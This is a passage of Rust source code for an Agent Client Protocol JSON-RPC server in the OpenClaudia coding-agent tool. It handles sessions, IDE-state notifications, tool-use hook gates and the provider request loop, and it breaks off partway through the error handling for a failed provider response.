//! ACP (Agent Client Protocol) Server — JSON-RPC 2.0 over stdio.
//!
//! Enables `OpenClaudia` to interoperate with `acpx` and other agent harnesses.
//! Implements all stable ACP methods:
//! - `initialize` — handshake/capability negotiation
//! - `authenticate` — credential validation
//! - `session/new` — create a new session
//! - `session/load` — resume a persisted session
//! - `session/prompt` — execute prompt with streaming updates
//! - `session/cancel` — cancel in-flight prompt
//! - `session/set_mode` — change session mode
//! - `session/set_config_option` — set session config
//!
//! Tool execution is delegated through ACP client methods:
//! - `fs/read_text_file`, `fs/write_text_file` — file operations
//! - `terminal/create`, `terminal/output`, `terminal/wait_for_exit`,
//!   `terminal/kill`, `terminal/release` — shell execution

use std::collections::{HashMap, VecDeque};
use std::io::{self, BufRead, Write};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

use anyhow::Result;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use tokio::sync::{mpsc, oneshot, Mutex};
use tracing::{debug, info, warn};

use crate::config::AppConfig;
use crate::hooks::{
    load_claude_code_hooks, merge_hooks_config, HookEngine, HookError, HookEvent, HookInput,
};
use crate::providers::get_adapter;
use crate::rules::{extract_extensions_from_tool_input, RulesEngine};
use crate::session::SessionManager;

// ============================================================================
// JSON-RPC types
// ============================================================================

/// Incoming JSON-RPC message (could be request, notification, or response).
#[derive(Debug, Clone, Deserialize)]
pub(crate) struct JsonRpcMessage {
    #[allow(dead_code)]
    jsonrpc: String,
    /// Present on requests (needs response) and responses.
    #[serde(default)]
    id: Option<Value>,
    /// Present on requests and notifications.
    #[serde(default)]
    method: Option<String>,
    /// Present on requests and notifications.
    #[serde(default)]
    params: Option<Value>,
    /// Present on successful responses.
    #[serde(default)]
    result: Option<Value>,
    /// Present on error responses.
    #[serde(default)]
    error: Option<JsonRpcError>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct JsonRpcError {
    code: i64,
    message: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<Value>,
}

/// Outgoing JSON-RPC response.
#[derive(Debug, Serialize)]
struct JsonRpcResponse {
    jsonrpc: &'static str,
    id: Value,
    #[serde(skip_serializing_if = "Option::is_none")]
    result: Option<Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<JsonRpcError>,
}

/// Outgoing JSON-RPC notification (no id, no response expected).
#[derive(Debug, Serialize)]
struct JsonRpcNotification {
    jsonrpc: &'static str,
    method: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    params: Option<Value>,
}

/// Outgoing JSON-RPC request (server → client, e.g. `fs/read_text_file`).
#[derive(Debug, Serialize)]
struct JsonRpcRequest {
    jsonrpc: &'static str,
    id: u64,
    method: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    params: Option<Value>,
}

// Standard JSON-RPC error codes
const PARSE_ERROR: i64 = -32700;
const INVALID_REQUEST: i64 = -32600;
const METHOD_NOT_FOUND: i64 = -32601;
const INVALID_PARAMS: i64 = -32602;
const _INTERNAL_ERROR: i64 = -32603;

// ============================================================================
// ACP Server
// ============================================================================

/// ACP server state.
pub struct AcpServer {
    /// Application config (providers, hooks, etc.)
    config: AppConfig,
    /// Session manager for persistence
    session_manager: SessionManager,
    /// Hook engine — wired through every tool dispatch in
    /// [`Self::execute_tool_via_acp`] so `PreToolUse` / `PostToolUse`
    /// gates apply to the ACP path (crosslink #694).
    hook_engine: HookEngine,
    /// Rules engine — consulted on every system-prompt build so
    /// `.openclaudia/rules` content lands in the ACP model context
    /// (crosslink #694).
    rules_engine: RulesEngine,
    /// Active ACP session ID → `OpenClaudia` session ID mapping.
    /// Bounded to [`MAX_ACP_SESSIONS`] entries; oldest insertion is
    /// evicted when a new session would push the count over the cap
    /// (crosslink #759).
    session_map: HashMap<String, String>,
    /// Insertion-order tracker that pairs with [`Self::session_map`].
    /// We deliberately do NOT use a third-party LRU crate: the cap is
    /// small (≤64) and the operations are O(N) but only run on
    /// session/new + session/load — paths that are already at the
    /// upper bound of "few times per second" usage (crosslink #759).
    session_order: VecDeque<String>,
    /// Conversation messages for the active session
    messages: Vec<Value>,
    /// Model name
    model: String,
    /// Optional provider API key (redacting newtype — see crosslink #256).
    /// Local/OpenAI-compatible providers may run without one; remote providers
    /// are validated by the CLI before the ACP server starts.
    api_key: Option<crate::providers::ApiKey>,
    /// Library-layer permission manager. Every tool call dispatched from
    /// `execute_tool_via_openclaudia` consults this gate — closes
    /// crosslink #505 for the ACP path.
    permission_mgr: crate::permissions::PermissionManager,
    /// Request ID counter for server→client requests
    next_request_id: AtomicU64,
    /// Pending responses for server→client requests
    #[allow(clippy::type_complexity)]
    pending_responses: Arc<Mutex<HashMap<u64, oneshot::Sender<Result<Value, JsonRpcError>>>>>,
    /// Cancellation flag for in-flight prompts
    cancel_flag: Arc<AtomicBool>,
    /// Channel for writing to stdout (serialized access)
    stdout_tx: mpsc::UnboundedSender<String>,
    /// Session config options set via `session/set_config_option`
    config_options: HashMap<String, Value>,
    /// Terminal ID counter for ACP terminal lifecycle
    #[allow(dead_code)]
    next_terminal_id: AtomicU64,
    /// Latest IDE-state snapshot received over ACP notifications.
    /// Updated by `ide/*` handlers; exposed via [`Self::ide_state`]
    /// so the prompt builder can inject it as context on the next turn.
    ide_state: IdeState,
}

/// Snapshot of everything the editor has told us about the user's
/// current workspace. All fields are optional and independently
/// updated — a single notification only touches the fields it names.
///
/// Port of the `ide/*` MCP notifications Claude Code consumes in
/// `hooks/useIdeSelection.ts`, `hooks/useIdeLogging.ts`, and the
/// broader bridge layer. Matches the field names used in Claude
/// Code's `SelectionChangedSchema` / file-opened notifications so
/// editor plugins can target both harnesses with one implementation.
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct IdeState {
    /// Currently focused file in the editor. Updated on
    /// `ide/file_opened` and cleared (to `None`) when the editor
    /// closes the last tab. Absolute path.
    pub active_file: Option<String>,
    /// Recently opened files (most-recent-first, capped to
    /// [`IDE_FILE_RING_CAP`]). Lets the agent see what the user was
    /// looking at across the last few minutes without flooding the
    /// system prompt.
    pub recent_files: Vec<String>,
    /// Current text selection, if any. Matches Claude Code's
    /// `SelectionData` shape: file path + start line + line count + text.
    pub selection: Option<IdeSelection>,
    /// Diagnostics pushed by LSP over `ide/diagnostics`. Keyed by
    /// file path for fast replacement when a file's diagnostics
    /// change.
    pub diagnostics: HashMap<String, Vec<IdeDiagnostic>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IdeSelection {
    pub file_path: String,
    pub line_start: u32,
    pub line_count: u32,
    pub text: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IdeDiagnostic {
    /// 0-indexed line. Matches LSP convention.
    pub line: u32,
    /// `error` / `warning` / `info` / `hint`.
    pub severity: String,
    pub message: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
}

/// Cap on [`IdeState::recent_files`] — older entries are pushed out.
/// Twelve covers a typical "active tabs" row without letting a
/// pathological editor spam fill the system prompt.
const IDE_FILE_RING_CAP: usize = 12;

/// Pure state-mutation helpers for IDE notifications. Extracted so
/// tests can exercise the notification logic against a bare
/// [`IdeState`] without constructing a full [`AcpServer`] (config,
/// permission manager, stdout channels, etc. aren't needed to
/// validate parse/update behavior).
pub(crate) fn apply_ide_file_opened(state: &mut IdeState, params: &Value) {
    let Some(path) = params.get("filePath").and_then(|v| v.as_str()) else {
        warn!("ide/file_opened notification missing `filePath`");
        return;
    };
    let path = path.to_string();
    state.active_file = Some(path.clone());
    // Move-to-front in the recents ring.
    state.recent_files.retain(|p| p != &path);
    state.recent_files.insert(0, path);
    if state.recent_files.len() > IDE_FILE_RING_CAP {
        state.recent_files.truncate(IDE_FILE_RING_CAP);
    }
}

pub(crate) fn apply_ide_file_closed(state: &mut IdeState, params: &Value) {
    let Some(path) = params.get("filePath").and_then(|v| v.as_str()) else {
        warn!("ide/file_closed notification missing `filePath`");
        return;
    };
    if state.active_file.as_deref() == Some(path) {
        state.active_file = None;
    }
    state.diagnostics.remove(path);
}

pub(crate) fn apply_ide_selection_changed(state: &mut IdeState, params: &Value) {
    let text = params.get("text").and_then(|v| v.as_str()).unwrap_or("");
    let file_path = params
        .get("filePath")
        .and_then(|v| v.as_str())
        .map(str::to_string);
    let range = params.get("selection");

    match (file_path, range) {
        (Some(fp), Some(sel)) => {
            let Some(start) = sel.get("start") else {
                warn!("ide/selection_changed: missing selection.start");
                return;
            };
            let Some(end) = sel.get("end") else {
                warn!("ide/selection_changed: missing selection.end");
                return;
            };
            let line_start = u32::try_from(
                start
                    .get("line")
                    .and_then(serde_json::Value::as_u64)
                    .unwrap_or(0),
            )
            .unwrap_or(u32::MAX);
            let line_end = u32::try_from(
                end.get("line")
                    .and_then(serde_json::Value::as_u64)
                    .unwrap_or_else(|| u64::from(line_start)),
            )
            .unwrap_or(u32::MAX);
            let line_count = line_end.saturating_sub(line_start).saturating_add(1);
            state.selection = Some(IdeSelection {
                file_path: fp,
                line_start,
                line_count,
                text: text.to_string(),
            });
        }
        _ => {
            state.selection = None;
        }
    }
}

pub(crate) fn apply_ide_diagnostics(state: &mut IdeState, params: &Value) {
    let Some(file_path) = params.get("filePath").and_then(|v| v.as_str()) else {
        warn!("ide/diagnostics notification missing `filePath`");
        return;
    };
    let Some(items) = params.get("diagnostics").and_then(|v| v.as_array()) else {
        state.diagnostics.remove(file_path);
        return;
    };
    let parsed: Vec<IdeDiagnostic> = items
        .iter()
        .filter_map(|item| {
            let line = u32::try_from(item.get("line")?.as_u64()?).ok()?;
            let severity = item.get("severity")?.as_str()?.to_string();
            let message = item.get("message")?.as_str()?.to_string();
            let source = item
                .get("source")
                .and_then(|v| v.as_str())
                .map(str::to_string);
            Some(IdeDiagnostic {
                line,
                severity,
                message,
                source,
            })
        })
        .collect();
    if parsed.is_empty() {
        state.diagnostics.remove(file_path);
    } else {
        state.diagnostics.insert(file_path.to_string(), parsed);
    }
}

/// Run the `PreToolUse` hook gate for a single tool dispatch.
///
/// Returns `None` when the tool may proceed, or `Some(AcpToolResult)`
/// with `is_error: true` and the deny reason in `content` when a hook
/// blocks the call.
///
/// Extracted as a free function (not an `AcpServer` method) so it can
/// be exercised by `pre_tool_gate_tests` without spinning up a full
/// server. Closes crosslink #694: the ACP path previously dispatched
/// `execute_tool_with_memory` directly, bypassing this gate entirely.
async fn pre_tool_use_gate(
    hook_engine: &HookEngine,
    tool_name: &str,
    tool_input: &Value,
) -> Option<AcpToolResult> {
    let extensions = extract_extensions_from_tool_input(tool_name, tool_input);

    let mut hook_input =
        HookInput::new(HookEvent::PreToolUse).with_tool(tool_name, tool_input.clone());
    if !extensions.is_empty() {
        hook_input = hook_input.with_extra("extensions", json!(extensions));
    }

    let hook_result = hook_engine.run(HookEvent::PreToolUse, &hook_input).await;

    if let Err(hook_err) = HookEngine::check_blocked(&hook_result) {
        let reason = match hook_err {
            HookError::Blocked(r) => r,
            other => other.to_string(),
        };
        warn!(
            tool = %tool_name,
            reason = %reason,
            "ACP PreToolUse hook blocked tool dispatch"
        );
        return Some(AcpToolResult {
            content: format!("Tool '{tool_name}' blocked by PreToolUse hook: {reason}"),
            is_error: true,
        });
    }

    None
}

fn parse_acp_tool_arguments(
    tool_name: &str,
    arguments_json: &str,
) -> Result<(HashMap<String, Value>, Value), AcpToolResult> {
    let value = serde_json::from_str::<Value>(arguments_json).map_err(|err| AcpToolResult {
        content: format!("Invalid tool arguments JSON for '{tool_name}': {err}"),
        is_error: true,
    })?;
    let Value::Object(map) = value else {
        return Err(AcpToolResult {
            content: format!(
                "Invalid tool arguments JSON for '{tool_name}': expected a JSON object, got {}",
                value_type_name(&value)
            ),
            is_error: true,
        });
    };
    let args = map.clone().into_iter().collect();
    Ok((args, Value::Object(map)))
}

const fn value_type_name(value: &Value) -> &'static str {
    match value {
        Value::Null => "null",
        Value::Bool(_) => "boolean",
        Value::Number(_) => "number",
        Value::String(_) => "string",
        Value::Array(_) => "array",
        Value::Object(_) => "object",
    }
}

/// Upper bound on the number of ACP-session-id → openclaudia-id
/// entries the server keeps in memory. Long-lived stdio sessions can
/// otherwise leak unbounded memory (crosslink #759). 64 is the bound
/// the issue's mandated refactor calls out; we mirror it here.
const MAX_ACP_SESSIONS: usize = 64;

/// Insert an ACP→openclaudia session-id mapping into `map`, evicting
/// the oldest entry first if `order` is already at `cap`. Idempotent
/// on re-insert: a session that is already present is bumped to the
/// most-recent position rather than duplicated, so a client that
/// re-loads the same session repeatedly does not get evicted by
/// itself (crosslink #759).
///
/// Free function so tests can drive the LRU semantics without
/// standing up a full `AcpServer` (which needs an mpsc sender,
/// session-persist directory, hook engine, etc.).
fn upsert_session_mapping_into(
    map: &mut HashMap<String, String>,
    order: &mut VecDeque<String>,
    cap: usize,
    acp_session_id: String,
    oc_session_id: String,
) {
    if let Some(existing_pos) = order.iter().position(|s| s == &acp_session_id) {
        // Move the existing key to the back (most-recent).
        order.remove(existing_pos);
    } else if order.len() >= cap {
        // Evict the oldest mapping before insert. We do NOT
        // remove the openclaudia session from disk — it remains
        // resumable via `session/load` even if the in-memory
        // mapping was evicted.
        if let Some(evict) = order.pop_front() {
            map.remove(&evict);
            debug!(evicted_acp_session = %evict, "Evicted oldest ACP session mapping (LRU cap)");
        }
    }
    map.insert(acp_session_id.clone(), oc_session_id);
    order.push_back(acp_session_id);
}

impl AcpServer {
    /// See [`upsert_session_mapping_into`]. Thin instance wrapper so
    /// existing call sites read naturally.
    fn upsert_session_mapping(&mut self, acp_session_id: String, oc_session_id: String) {
        upsert_session_mapping_into(
            &mut self.session_map,
            &mut self.session_order,
            MAX_ACP_SESSIONS,
            acp_session_id,
            oc_session_id,
        );
    }

    /// Create a new ACP server from the loaded config.
    #[must_use]
    pub fn new(
        config: AppConfig,
        model: String,
        api_key: Option<crate::providers::ApiKey>,
        stdout_tx: mpsc::UnboundedSender<String>,
    ) -> Self {
        let persist_dir = dirs::data_dir()
            .unwrap_or_else(|| std::path::PathBuf::from("."))
            .join("openclaudia")
            .join("sessions");

        let claude_hooks = load_claude_code_hooks();
        let merged_hooks = merge_hooks_config(config.hooks.clone(), claude_hooks);
        let hook_engine = HookEngine::new(merged_hooks);
        let rules_engine = RulesEngine::new(".openclaudia/rules");
        let permission_mgr = crate::permissions::PermissionManager::new(
            std::path::PathBuf::from(".openclaudia/permissions.json"),
            true,
            config.permissions.default_allow.clone(),
        );

        Self {
            config,
            session_manager: SessionManager::new(persist_dir),
            hook_engine,
            rules_engine,
            session_map: HashMap::new(),
            session_order: VecDeque::new(),
            messages: Vec::new(),
            model,
            api_key,
            permission_mgr,
            next_request_id: AtomicU64::new(1),
            pending_responses: Arc::new(Mutex::new(HashMap::new())),
            cancel_flag: Arc::new(AtomicBool::new(false)),
            stdout_tx,
            config_options: HashMap::new(),
            next_terminal_id: AtomicU64::new(1),
            ide_state: IdeState::default(),
        }
    }

    /// Read-only snapshot of the current IDE state (active file,
    /// selection, recent files, diagnostics). Used by the prompt
    /// builder to inject editor context into the system prompt on
    /// the next turn.
    #[must_use]
    pub const fn ide_state(&self) -> &IdeState {
        &self.ide_state
    }

    // ========================================================================
    // Transport helpers
    // ========================================================================

    /// Send a JSON-RPC response.
    fn send_response(&self, id: Value, result: Option<Value>, error: Option<JsonRpcError>) {
        let resp = JsonRpcResponse {
            jsonrpc: "2.0",
            id,
            result,
            error,
        };
        if let Ok(line) = serde_json::to_string(&resp) {
            let _ = self.stdout_tx.send(line);
        }
    }

    /// Send a JSON-RPC notification (no response expected).
    fn send_notification(&self, method: &str, params: Option<Value>) {
        let notif = JsonRpcNotification {
            jsonrpc: "2.0",
            method: method.to_string(),
            params,
        };
        if let Ok(line) = serde_json::to_string(&notif) {
            let _ = self.stdout_tx.send(line);
        }
    }

    /// Send a JSON-RPC request to the client and await the response.
    async fn client_request(&self, method: &str, params: Option<Value>) -> Result<Value, String> {
        let id = self.next_request_id.fetch_add(1, Ordering::SeqCst);
        let (tx, rx) = oneshot::channel();

        // Register pending response
        {
            let mut pending = self.pending_responses.lock().await;
            pending.insert(id, tx);
        }

        // Send request
        let req = JsonRpcRequest {
            jsonrpc: "2.0",
            id,
            method: method.to_string(),
            params,
        };
        if let Ok(line) = serde_json::to_string(&req) {
            let _ = self.stdout_tx.send(line);
        }

        // Await response with timeout
        match tokio::time::timeout(std::time::Duration::from_mins(5), rx).await {
            Ok(Ok(Ok(value))) => Ok(value),
            Ok(Ok(Err(rpc_err))) => Err(format!("RPC error {}: {}", rpc_err.code, rpc_err.message)),
            Ok(Err(_)) => Err("Client request channel closed".to_string()),
            Err(_) => {
                // Clean up pending
                let mut pending = self.pending_responses.lock().await;
                pending.remove(&id);
                drop(pending);
                Err("Client request timed out".to_string())
            }
        }
    }

    /// Send a session/update notification.
    fn send_session_update(&self, session_id: &str, update_type: &str, content: &Value) {
        self.send_notification(
            "session/update",
            Some(json!({
                "sessionId": session_id,
                "sessionUpdate": update_type,
                "content": content,
            })),
        );
    }

    fn send_error(&self, id: Value, code: i64, message: &str) {
        self.send_response(
            id,
            None,
            Some(JsonRpcError {
                code,
                message: message.to_string(),
                data: None,
            }),
        );
    }

    // ========================================================================
    // Message routing
    // ========================================================================

    /// Route an incoming JSON-RPC message.
    async fn handle_message(&mut self, msg: JsonRpcMessage) {
        // Is this a response to a server→client request?
        if msg.method.is_none() && (msg.result.is_some() || msg.error.is_some()) {
            if let Some(id) = msg.id.as_ref().and_then(serde_json::Value::as_u64) {
                let mut pending = self.pending_responses.lock().await;
                if let Some(tx) = pending.remove(&id) {
                    if let Some(err) = msg.error {
                        let _ = tx.send(Err(err));
                    } else {
                        let _ = tx.send(Ok(msg.result.unwrap_or(Value::Null)));
                    }
                }
            }
            return;
        }

        // It's a request or notification from the client
        let method = if let Some(ref m) = msg.method {
            m.clone()
        } else {
            if let Some(id) = msg.id {
                self.send_error(id, INVALID_REQUEST, "Missing method field");
            }
            return;
        };

        let params = msg.params.unwrap_or(Value::Null);

        match method.as_str() {
            "initialize" => self.handle_initialize(msg.id, params),
            "authenticate" => self.handle_authenticate(msg.id, params),
            "session/new" => self.handle_session_new(msg.id, params),
            "session/load" => self.handle_session_load(msg.id, &params),
            "session/prompt" => self.handle_session_prompt(msg.id, params).await,
            "session/cancel" => self.handle_session_cancel(msg.id, params),
            "session/set_mode" => self.handle_session_set_mode(msg.id, &params),
            "session/set_config_option" => self.handle_session_set_config_option(msg.id, &params),
            // ─── IDE bridge notifications (crosslink #517) ───
            // Editor plugins push file-open / selection / diagnostic
            // events here. They're fire-and-forget (no response) —
            // the next prompt turn reads ide_state() for context.
            "ide/file_opened" => self.handle_ide_file_opened(&params),
            "ide/file_closed" => self.handle_ide_file_closed(&params),
            "ide/selection_changed" => self.handle_ide_selection_changed(&params),
            "ide/diagnostics" => self.handle_ide_diagnostics(&params),
            _ => {
                if let Some(id) = msg.id {
                    self.send_error(id, METHOD_NOT_FOUND, &format!("Unknown method: {method}"));
                }
            }
        }
    }

    // ========================================================================
    // ACP method handlers
    // ========================================================================

    fn handle_initialize(&self, id: Option<Value>, _params: Value) {
        let Some(id) = id else { return };

        self.send_response(
            id,
            Some(json!({
                "protocolVersion": "0.1",
                "serverInfo": {
                    "name": "openclaudia",
                    "version": env!("CARGO_PKG_VERSION"),
                },
                "capabilities": {
                    "prompts": true,
                    "tools": true,
                    "fs": {
                        "read": true,
                        "write": true,
                    },
                    "terminal": true,
                },
            })),
            None,
        );

        info!("ACP initialize handshake complete");
    }

    fn handle_authenticate(&self, id: Option<Value>, _params: Value) {
        let Some(id) = id else { return };

        // OpenClaudia uses its own provider API keys from config, so ACP auth
        // is accepted unconditionally — the client doesn't need to provide credentials.
        self.send_response(
            id,
            Some(json!({
                "authenticated": true,
            })),
            None,
        );
    }

    fn handle_session_new(&mut self, id: Option<Value>, _params: Value) {
        let Some(id) = id else { return };

        let session = self.session_manager.get_or_create_session();
        let oc_session_id = session.id.clone();

        // Generate an ACP-facing session ID
        let acp_session_id = uuid::Uuid::new_v4().to_string();
        self.upsert_session_mapping(acp_session_id.clone(), oc_session_id);
        self.messages.clear();

        self.send_response(
            id,
            Some(json!({
                "sessionId": acp_session_id,
            })),
            None,
        );

        info!(acp_session_id = %acp_session_id, "Created new ACP session");
    }

    fn handle_session_load(&mut self, id: Option<Value>, params: &Value) {
        let Some(id) = id else { return };

        let acp_session_id = if let Some(sid) = params.get("sessionId").and_then(|v| v.as_str()) {
            sid.to_string()
        } else {
            self.send_error(id, INVALID_PARAMS, "Missing sessionId");
            return;
        };

        // Check if we know this ACP session
        if let Some(oc_id) = self.session_map.get(&acp_session_id) {
            // Try to load the persisted OpenClaudia session
            if let Some(session) = self.session_manager.load_session(oc_id) {
                // Restore it as active
                self.session_manager.start_coding(&session.id);
                self.send_response(
                    id,
                    Some(json!({
                        "sessionId": acp_session_id,
                        "loaded": true,
                    })),
                    None,
                );
                info!(acp_session_id = %acp_session_id, "Loaded ACP session");
                return;
            }
        }

        // Unknown or unloadable — create a new session and map it
        let session = self.session_manager.get_or_create_session();
        let oc_session_id = session.id.clone();
        self.upsert_session_mapping(acp_session_id.clone(), oc_session_id);
        self.messages.clear();

        self.send_response(
            id,
            Some(json!({
                "sessionId": acp_session_id,
                "loaded": false,
            })),
            None,
        );

        info!(acp_session_id = %acp_session_id, "session/load fell back to new session");
    }

    fn handle_session_cancel(&self, id: Option<Value>, _params: Value) {
        self.cancel_flag.store(true, Ordering::SeqCst);

        if let Some(id) = id {
            self.send_response(
                id,
                Some(json!({
                    "cancelled": true,
                })),
                None,
            );
        }

        info!("Prompt cancellation requested");
    }

    fn handle_session_set_mode(&self, id: Option<Value>, params: &Value) {
        let Some(id) = id else { return };

        let Some(mode) = params.get("mode").and_then(|v| v.as_str()) else {
            self.send_error(id, INVALID_PARAMS, "Missing mode");
            return;
        };

        // Map to OpenClaudia session modes
        match mode {
            "initializer" | "coding" | "auto" => {
                self.send_response(id, Some(json!({"mode": mode})), None);
                info!(mode = %mode, "Session mode set");
            }
            _ => {
                self.send_error(
                    id,
                    INVALID_PARAMS,
                    &format!("Invalid mode: {mode}. Supported: initializer, coding, auto"),
                );
            }
        }
    }

    fn handle_session_set_config_option(&mut self, id: Option<Value>, params: &Value) {
        let Some(id) = id else { return };

        let key = if let Some(k) = params.get("key").and_then(|v| v.as_str()) {
            k.to_string()
        } else {
            self.send_error(id, INVALID_PARAMS, "Missing key");
            return;
        };

        let value = if let Some(v) = params.get("value") {
            v.clone()
        } else {
            self.send_error(id, INVALID_PARAMS, "Missing value");
            return;
        };

        self.config_options.insert(key.clone(), value.clone());
        self.send_response(id, Some(json!({"key": key, "value": value})), None);

        info!(key = %key, "Config option set");
    }

    // ========================================================================
    // IDE bridge notifications (crosslink #517)
    //
    // These are fire-and-forget JSON-RPC notifications — the editor
    // plugin pushes events as they happen, and the agent reads them
    // from `ide_state()` when building the next prompt. Invalid
    // payloads are logged at `warn` and dropped rather than surfaced
    // as errors: we'd rather lose one notification than crash the
    // bridge loop over a schema drift in a 3rd-party plugin.
    // ========================================================================

    fn handle_ide_file_opened(&mut self, params: &Value) {
        apply_ide_file_opened(&mut self.ide_state, params);
    }

    fn handle_ide_file_closed(&mut self, params: &Value) {
        apply_ide_file_closed(&mut self.ide_state, params);
    }

    fn handle_ide_selection_changed(&mut self, params: &Value) {
        apply_ide_selection_changed(&mut self.ide_state, params);
    }

    fn handle_ide_diagnostics(&mut self, params: &Value) {
        apply_ide_diagnostics(&mut self.ide_state, params);
    }

    // ========================================================================
    // Prompt execution — the core agentic loop
    // ========================================================================

    async fn handle_session_prompt(&mut self, id: Option<Value>, params: Value) {
        let Some(id) = id else { return };

        let acp_session_id = if let Some(sid) = params.get("sessionId").and_then(|v| v.as_str()) {
            sid.to_string()
        } else {
            self.send_error(id, INVALID_PARAMS, "Missing sessionId");
            return;
        };

        let prompt = if let Some(p) = params.get("prompt").and_then(|v| v.as_str()) {
            p.to_string()
        } else {
            self.send_error(id, INVALID_PARAMS, "Missing prompt");
            return;
        };

        // Reset cancel flag
        self.cancel_flag.store(false, Ordering::SeqCst);

        // Add user message
        self.messages.push(json!({
            "role": "user",
            "content": prompt,
        }));

        // Run the agentic loop
        let stop_reason = self.run_prompt_loop(&acp_session_id).await;

        // Record turn metrics
        if let Some(session) = self.session_manager.get_session_mut() {
            session.request_count += 1;
            session.updated_at = chrono::Utc::now();
        }

        self.send_response(
            id,
            Some(json!({
                "stopReason": stop_reason,
            })),
            None,
        );
    }

    /// Run the prompt → tool calls → re-prompt loop.
    // Complex protocol handler, splitting would reduce readability
    #[allow(clippy::too_many_lines)]
    async fn run_prompt_loop(&mut self, acp_session_id: &str) -> String {
        // Crosslink #433: a typo in `proxy.target` now surfaces here as
        // an explicit error instead of being silently mapped to
        // `OpenAIAdapter`. This matches the other early-exit patterns in
        // this loop ("cancelled", "error", "end_turn").
        let adapter = match get_adapter(&self.config.proxy.target) {
            Ok(a) => a,
            Err(e) => {
                tracing::error!(error = %e, "ACP: unknown provider in config.proxy.target");
                return "error".to_string();
            }
        };
        let client = reqwest::Client::new();
        // crosslink #717: the iteration ceiling is now resolved from
        // `AcpConfig` (default 50, matches the previous hard-coded
        // value). Operators raising the cap to support long-horizon
        // agents no longer need to recompile — set it via the
        // `acp.max_iterations` YAML key or the
        // `OPENCLAUDIA_ACP_MAX_ITERATIONS` env var.
        let max_iterations = match crate::config::AcpConfig::load() {
            Ok(cfg) => cfg.max_iterations,
            Err(e) => {
                self.send_session_update(
                    acp_session_id,
                    "agent_message_chunk",
                    &json!({"type": "text", "text": format!("Invalid ACP configuration: {e}")}),
                );
                return "error".to_string();
            }
        };

        for iteration in 0..max_iterations {
            if self.cancel_flag.load(Ordering::SeqCst) {
                return "cancelled".to_string();
            }

            // Build the request
            let tools =
                match acp_tool_definitions_for_chat_request(crate::tools::get_tool_definitions()) {
                    Ok(tools) => tools,
                    Err(e) => {
                        let text = format!("Internal ACP tool registry error: {e}");
                        self.send_session_update(
                            acp_session_id,
                            "agent_message_chunk",
                            &json!({"type": "text", "text": text}),
                        );
                        return "error".to_string();
                    }
                };
            // Crosslink #694: inject `.openclaudia/rules` content into the
            // system prompt so the ACP path receives the same rules
            // context the proxy path injects via `ContextInjector`. The
            // rules engine is queried against extensions parsed out of
            // every message in the turn buffer; an empty string is fine —
            // `build_system_prompt` ignores it.
            let rules_content = self.collect_rules_for_messages();
            let rules_arg = if rules_content.is_empty() {
                None
            } else {
                Some(rules_content.as_str())
            };
            // crosslink #717: pass the working directory through so the
            // ACP-served prompt names the same cwd block the proxy path
            // injects. Skipping this dropped the `current working dir`
            // hint from every ACP turn — tools that resolve relative
            // paths inherited a different mental model than the model
            // was given. Best-effort: a failed `current_dir` call simply
            // omits the block (matches the proxy-path behaviour).
            let cwd_string = std::env::current_dir()
                .ok()
                .map(|p| p.to_string_lossy().into_owned());
            let system_prompt = crate::prompt::build_system_prompt_with_cwd(
                None,
                rules_arg,
                None,
                cwd_string.as_deref(),
            );

            // Prepend system prompt to messages
            let mut all_messages: Vec<crate::proxy::ChatMessage> =
                vec![crate::proxy::ChatMessage {
                    role: "system".to_string(),
                    content: crate::proxy::MessageContent::Text(system_prompt),
                    name: None,
                    tool_calls: None,
                    tool_call_id: None,
                    extra: std::collections::HashMap::new(),
                }];
            let decoded_messages = match decode_acp_messages(&self.messages) {
                Ok(messages) => messages,
                Err(e) => {
                    self.send_session_update(
                        acp_session_id,
                        "agent_message_chunk",
                        &json!({"type": "text", "text": format!("Invalid ACP message history: {e}")}),
                    );
                    return "error".to_string();
                }
            };
            all_messages.extend(decoded_messages);

            // Build a ChatCompletionRequest for the adapter
            let chat_request = crate::proxy::ChatCompletionRequest {
                model: self.model.clone(),
                messages: all_messages,
                temperature: None,
                max_tokens: None,
                stream: Some(true),
                tools: Some(tools),
                tool_choice: None,
                extra: std::collections::HashMap::new(),
            };

            // Transform for provider
            let transformed = match adapter.transform_request_with_thinking(
                &chat_request,
                &self
                    .config
                    .active_provider()
                    .map(|p| p.thinking.clone())
                    .unwrap_or_default(),
            ) {
                Ok(t) => t,
                Err(e) => {
                    self.send_session_update(
                        acp_session_id,
                        "agent_message_chunk",
                        &json!({"type": "text", "text": format!("Provider error: {}", e)}),
                    );
                    return "error".to_string();
                }
            };

            // Determine endpoint
            let Some(provider) = self.config.active_provider() else {
                return "error".to_string();
            };
            let endpoint = format!(
                "{}{}",
                provider.base_url,
                adapter.chat_endpoint(&self.model)
            );

            // Build HTTP request with headers
            let extra_headers: Vec<(String, String)> = provider
                .headers
                .iter()
                .map(|(key, value)| (key.clone(), value.clone()))
                .collect();
            let headers = match crate::pipeline::resolve_headers(
                &self.config.proxy.target,
                self.api_key.as_ref(),
                None,
                &extra_headers,
            ) {
                Ok(headers) => headers,
                Err(e) => {
                    self.send_session_update(
                        acp_session_id,
                        "agent_message_chunk",
                        &json!({"type": "text", "text": format!("Provider error: {}", e)}),
                    );
                    return "error".to_string();
                }
            };

            let mut req = client.post(&endpoint).json(&transformed);
            for (key, value) in &headers {
                req = req.header(key, value);
            }

            // Send request
            debug!(endpoint = %endpoint, iteration = iteration, "Sending provider request");
            let response = match req.send().await {
                Ok(r) => r,
                Err(e) => {
                    self.send_session_update(
                        acp_session_id,
                        "agent_message_chunk",
                        &json!({"type": "text", "text": format!("Request failed: {}", e)}),
                    );
                    return "error".to_string();
                }
            };

            if !response.status().is_success() {
                let status = response.status();
                let content_type = response
                    .headers()
                    .get("content-type")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("")
                    .to_string();
                let body = response.text().await.unwrap_or_default();
                let error_msg = if content_type.contains("text/html") {
                    format!("Error {status}: (HTML response — check provider configuration)")
                } else {
